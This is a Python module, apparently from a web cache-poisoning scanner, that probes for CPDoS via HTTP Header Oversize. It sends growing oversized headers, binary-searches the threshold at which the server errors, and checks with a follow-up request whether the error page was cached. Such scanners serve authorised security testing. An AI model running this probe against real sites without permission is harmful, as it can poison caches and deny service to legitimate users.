#!/usr/bin/env python3
"""
Attempts to find Cache Poisoning with HTTP Header Oversize (HHO)
https://cpdos.org/#HHO
"""
import utils.proxy as proxy
from utils.style import Colors, Identify
from utils.utils import configure_logger, human_time, requests, random, random_ua
from utils.print_utils import cache_tag_verify
from modules.global_requests import combinations, exclude_combinations

logger = configure_logger(__name__)
VULN_NAME = "HHO"

def HHO(
    url: str,
    s: requests.Session,
    main_response: requests.Response,
    authent: tuple[str, str] | None,
    fp_results: tuple[int, int] | None,
    human: str,
) -> None:
    """
    Perform a Header Oversize Denial of Service (HHO DOS) attack.
    
    Strategy:
    1. Start with small header and increase size progressively
    2. Test multiple headers simultaneously (more realistic)
    3. Use binary search to find exact threshold
    4. Confirm vulnerability with control requests
    """
    
    main_status_code = main_response.status_code
    main_response_len = len(main_response.content)
    
    header_size = 1000  # Start small
    max_size = 100000   # Max 100KB
    error_status = None
    error_size = None
    
    while header_size < max_size:
        big_value = "A" * header_size
        
        headers = {}
        for i in range(5):  # 5 headers oversized
            headers[f"X-Oversized-{i}"] = big_value
        
        uri = f"{url}{random.randrange(9999)}"
        
        try:
            s.headers.update(random_ua())
            probe = s.get(
                uri,
                headers=headers,
                auth=authent,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )
            
            combo_key = (probe.status_code, len(probe.content))
            
            print(
                f" {Colors.BLUE}[HHO] Testing size: {header_size}b × 5 headers = {header_size * 5}b total | Status: {probe.status_code}{Colors.RESET}\r",
                end="",
            )
            print("\033[K", end="")
            
            if (
                probe.status_code in [400, 413, 431, 500, 502, 503]
                and probe.status_code != main_status_code
                and combo_key not in exclude_combinations
            ):
                error_status = probe.status_code
                error_size = header_size
                logger.info(f"Error detected at size {header_size}b: status {error_status}")
                break
            
            if header_size < 10000:
                header_size *= 2 
            else:
                header_size += 5000 
            
            human_time(human)
            
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error at size {header_size}b")
            error_status = "Connection Error"
            error_size = header_size
            break
        except requests.Timeout:
            logger.error(f"Timeout at size {header_size}b")
            error_status = "Timeout"
            error_size = header_size
            break
        except Exception as e:
            logger.exception(e)
            break
    
    if not error_status:
        logger.info(f"[HHO] No error detected up to {max_size}b")
        return
    
    low = error_size // 2
    high = error_size
    exact_threshold = error_size
    
    for _ in range(10):
        mid = (low + high) // 2
        big_value = "A" * mid
        
        headers = {}
        for i in range(5):
            headers[f"X-Oversized-{i}"] = big_value
        
        uri = f"{url}{random.randrange(9999)}"
        
        try:
            probe = s.get(
                uri,
                headers=headers,
                auth=authent,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )
            
            print(f" {Colors.BLUE}[HHO] Binary search: {mid}b | Status: {probe.status_code}{Colors.RESET}\r", end="")
            print("\033[K", end="")
            
            if probe.status_code in [400, 413, 431, 500, 502, 503]:
                high = mid
                exact_threshold = mid
            else:
                low = mid
            
            if high - low < 100:
                break
                
            human_time(human)
            
        except Exception as e:
            logger.exception(e)
            break
    
    confirmed = False
    big_value = "A" * exact_threshold
    headers = {}
    for i in range(5):
        headers[f"X-Oversized-{i}"] = big_value
    
    uri = f"{url}{random.randrange(9999)}"
    
    try:
        probe = s.get(
            uri,
            headers=headers,
            auth=authent,
            allow_redirects=False,
            verify=False,
            timeout=10,
        )
        
        human_time(human)
        
        control = s.get(
            uri,
            auth=authent,
            allow_redirects=False,
            verify=False,
            timeout=10,
        )
        
        if (
            probe.status_code in [400, 413, 431, 500, 502, 503]
            and probe.status_code == control.status_code
            and control.status_code != main_status_code
        ):
            reason = f"DIFFERENT STATUS-CODE {main_status_code} > {control.status_code} (threshold: {exact_threshold}b × 5 = {exact_threshold * 5}b total)"
            status = f"{Identify.confirmed}"
            severity = "confirmed"
            confirmed = True
            
        elif probe.status_code in [400, 413, 431, 500, 502, 503]:
            reason = f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code} (threshold: {exact_threshold}b × 5 = {exact_threshold * 5}b total)"
            status = f"{Identify.behavior}"
            severity = "behavior"
            
        else:
            logger.info("[HHO] Could not confirm vulnerability")
            return
        
        print(
            f" {status} | {VULN_NAME} | {reason} | CACHETAG {cache_tag_verify(probe)} | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: {Colors.THISTLE}X-Oversized-{{0-4}}: {'A' * min(50, exact_threshold)}...{Colors.RESET}"
        )
        
        if proxy.proxy_enabled:
            from utils.proxy import proxy_request
            proxy_request(s, "GET", uri, headers=headers, data=None, severity=severity)
            
    except Exception as e:
        logger.exception(e)


def HHO_single_header(
    url: str,
    s: requests.Session,
    main_response: requests.Response,
    authent: tuple[str, str] | None,
    fp_results: tuple[int, int] | None,
    human: str,
) -> None:
    
    main_status_code = main_response.status_code
    
    print(f"\n{Colors.BLUE}[HHO-Single] Testing single oversized header{Colors.RESET}")
    
    header_size = 1000
    max_size = 1000000  # 1MB pour un seul header
    
    while header_size < max_size:
        big_value = "A" * header_size
        headers = {"X-Oversized-Header": big_value}
        
        uri = f"{url}{random.randrange(9999)}"
        
        try:
            s.headers.update(random_ua())
            probe = s.get(
                uri,
                headers=headers,
                auth=authent,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )
            
            print(
                f" {Colors.BLUE}[HHO-Single] Size: {header_size}b | Status: {probe.status_code}{Colors.RESET}\r",
                end="",
            )
            print("\033[K", end="")
            
            if (
                probe.status_code in [400, 413, 431, 500, 502, 503]
                and probe.status_code != main_status_code
            ):
                print()
                
                control = s.get(uri, auth=authent, allow_redirects=False, verify=False, timeout=10)
                
                if probe.status_code == control.status_code:
                    status = f"{Identify.confirmed}"
                    severity = "confirmed"
                else:
                    status = f"{Identify.behavior}"
                    severity = "behavior"
                
                reason = f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code} (single header: {header_size}b)"
                
                print(
                    f" {status} | {VULN_NAME}-Single | {reason} | CACHETAG {cache_tag_verify(probe)} | {Colors.BLUE}{uri}{Colors.RESET}"
                )
                
                if proxy.proxy_enabled:
                    from utils.proxy import proxy_request
                    proxy_request(s, "GET", uri, headers=headers, data=None, severity=severity)
                
                break
            
            if header_size < 10000:
                header_size *= 2
            else:
                header_size += 10000
            
            human_time(human)
            
        except Exception as e:
            logger.exception(e)
            break
    
    print()